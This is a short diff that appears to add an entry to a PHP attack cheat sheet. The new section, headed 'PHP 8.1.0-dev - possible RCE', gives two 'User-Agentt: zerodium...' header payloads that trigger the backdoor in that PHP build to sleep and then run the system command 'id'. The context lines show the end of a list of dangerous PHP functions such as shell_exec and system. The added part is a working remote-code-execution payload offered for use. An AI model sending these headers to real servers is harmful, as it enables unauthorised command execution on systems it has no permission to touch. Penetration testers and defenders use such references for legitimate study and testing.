@@ -63,3 +63,8 @@ shell_exec
 system
 ```
 
+### PHP 8.1.0-dev - possible RCE
+```
+User-Agentt: zerodiumsleep(5);
+User-Agentt: zerodiumsystem('id');
+```
